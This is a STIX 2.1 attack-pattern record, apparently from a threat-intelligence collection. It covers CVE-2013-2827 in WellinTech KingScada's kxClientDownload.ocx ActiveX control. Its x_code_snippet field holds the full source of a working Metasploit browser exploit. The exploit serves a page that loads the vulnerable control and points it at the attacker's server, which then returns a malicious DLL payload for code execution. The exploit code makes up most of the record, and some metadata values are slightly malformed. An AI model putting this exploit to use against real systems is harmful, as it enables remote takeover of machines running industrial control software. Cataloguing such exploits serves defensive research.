{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f73998f-13f9-443f-96a6-817fd0a792e3",
    "created": "2024-08-14T16:40:01.561059Z",
    "modified": "2024-08-14T16:40:01.561063Z",
    "name": "KingScada kxClientDownload.ocx ActiveX Remote Code Execution",
    "description": " This module abuses the kxClientDownload.ocx ActiveX control distributed with WellingTech KingScada.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/wellintech_kingscada_kxclientdownload.rb",
            "external_id": "wellintech_kingscada_kxclientdownload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2827"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/advisories/ICSA-13-344-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'KingScada kxClientDownload.ocx ActiveX Remote Code Execution',\n      'Description'    => %q{\n        This module abuses the kxClientDownload.ocx ActiveX control distributed with WellingTech KingScada.\n        The ProjectURL property can be abused to download and load arbitrary DLLs from\n        arbitrary locations, leading to arbitrary code execution, because of a dangerous\n        usage of LoadLibrary. Due to the nature of the vulnerability, this module will work\n        only when Protected Mode is not present or not enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrea Micalizzi',  # aka rgod original discovery\n          'juan vazquez'       # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-2827'],\n          ['OSVDB', '102135'],\n          ['BID', '64941'],\n          ['ZDI', '14-011'],\n          ['URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-13-344-01']\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'BrowserRequirements' =>\n        {\n          :source      => /script|headers/i,\n          :os_name     => OperatingSystems::Match::WINDOWS,\n          :ua_name     => /MSIE|KXCLIE/i,\n          :activex => [\n            {\n              clsid: '{1A90B808-6EEF-40FF-A94C-D7C43C847A9F}',\n              method: 'ProjectURL'\n            }\n          ],\n        },\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n          'DisableNopes'    => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-14'))\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Requested: #{request.uri}\")\n\n    if request.uri =~ /\\/libs\\/.*\\.dll/\n      print_good(\"Sending DLL payload\")\n      send_response(cli,\n        generate_payload_dll(:code => get_payload(cli, target_info)),\n        'Content-Type' => 'application/octet-stream'\n      )\n      return\n    elsif request.uri =~ /\\/libs\\//\n      print_status(\"Sending not found\")\n      send_not_found(cli)\n      return\n    end\n\n    content = <<-EOS\n<html>\n<body>\n<object classid='clsid:1A90B808-6EEF-40FF-A94C-D7C43C847A9F' id='#{rand_text_alpha(10 + rand(10))}'>\n<param name=\"ProjectURL\" value=\"#{get_module_uri}\"></param>\n</object>\n</body>\n</html>\n    EOS\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, content)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-01-14",
    "x_mitre_platforms": [
        "win'"
    ]
}